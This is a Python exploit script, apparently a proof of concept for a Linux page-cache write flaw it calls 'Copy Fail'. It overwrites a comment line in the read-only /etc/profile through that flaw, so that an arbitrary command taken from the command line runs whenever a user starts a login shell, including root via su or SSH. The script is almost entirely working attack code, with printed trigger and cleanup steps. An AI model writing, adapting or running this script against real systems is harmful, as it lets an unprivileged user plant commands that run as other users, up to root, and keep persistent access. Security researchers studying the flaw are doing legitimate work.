#!/usr/bin/env python3
"""
Copy Fail — /etc/profile command injection
============================================
Overwrites a comment line in /etc/profile with a shell command.
The injected command executes as root when root logs in via SSH or `su -`.

Technique: find a comment line (starts with '#'), overwrite with a command
followed by '#' to comment out the remainder of the original line.

Example: "# It's NOT a good idea..." → "id>>/tmp/pwned  #a good idea..."

Works on all Linux distributions (/etc/profile is always 0644).

Tested on: CentOS Stream 8, kernel 4.18.0-553.6.1.el8
"""
import os
import sys
from copyfail_core import page_cache_write

TARGET_FILE = "/etc/profile"
DEFAULT_COMMAND = "id>>/tmp/CF-PWNED  #"  # trailing '#' masks original text


def find_comment_offset(path, min_length=40):
    """Find a suitable comment line with enough space for the payload."""
    with open(path) as f:
        content = f.read()

    offset = 0
    for line in content.split('\n'):
        stripped = line.lstrip()
        if stripped.startswith('#') and len(stripped) >= min_length:
            # Use the position of '#' in the original content
            hash_pos = content.index(stripped, offset)
            return hash_pos, stripped
        offset += len(line) + 1  # +1 for newline

    return None, None


def main():
    command = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
    if not command.endswith('#'):
        command += ' #'
        print(f"[*] Appended trailing '#' for comment masking: {command}")

    offset, comment_line = find_comment_offset(TARGET_FILE)
    if offset is None:
        print("[-] No suitable comment line found in /etc/profile")
        sys.exit(1)

    print(f"[*] Target: {TARGET_FILE}")
    print(f"[*] Comment at offset {offset}: {comment_line[:60]}...")
    print(f"[*] Injecting: {command}")

    # Pad command to 4-byte boundary (page_cache_write handles partial trailing)
    payload = command.encode()
    writes_needed = (len(payload) + 3) // 4
    print(f"[*] Payload: {len(payload)} bytes, {writes_needed} writes")

    fd = os.open(TARGET_FILE, os.O_RDONLY)
    page_cache_write(fd, offset, payload)

    # Verify
    os.lseek(fd, offset, os.SEEK_SET)
    result = os.read(fd, len(payload))
    os.close(fd)

    if result == payload:
        print(f"[+] SUCCESS: command injected into /etc/profile")
        print(f"[*] Trigger: any login shell (ssh, su -, console login)")
        print(f"[*] The command runs as the logging-in user's UID")
        print(f"[*] Restore: echo 3 > /proc/sys/vm/drop_caches")
    else:
        print(f"[-] Verification failed: {result}")


if __name__ == "__main__":
    main()
